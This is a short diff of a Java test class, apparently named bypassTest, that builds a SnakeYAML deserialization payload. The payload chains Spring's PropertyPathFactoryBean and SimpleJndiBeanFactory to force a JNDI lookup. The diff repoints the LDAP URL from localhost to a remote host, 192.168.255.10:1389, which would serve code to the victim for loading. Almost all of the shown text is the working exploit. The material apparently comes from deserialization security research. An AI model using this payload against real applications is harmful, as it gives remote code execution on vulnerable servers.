@@ -30,10 +30,10 @@ public class bypassTest {
 
     public static void main(String[] args) {
         String payload = "!<tag:yaml.org,2002:org.springframework.beans.factory.config.PropertyPathFactoryBean> \n" +
-                " targetBeanName: \"ldap://localhost:1389/Exploit\"\n" +
+                " targetBeanName: \"ldap://192.168.255.10:1389/tr7j8w\"\n" +
                 " propertyPath: Drunkbaby\n" +
                 " beanFactory: !<tag:yaml.org,2002:org.springframework.jndi.support.SimpleJndiBeanFactory> \n" +
-                "  shareableResources: [\"ldap://localhost:1389/Exploit\"]";
+                "  shareableResources: [\"ldap://192.168.255.10:1389/tr7j8w\"]";
         bypassTest bypassTest = new bypassTest();
         bypassTest.yamlLoads(payload);
     }
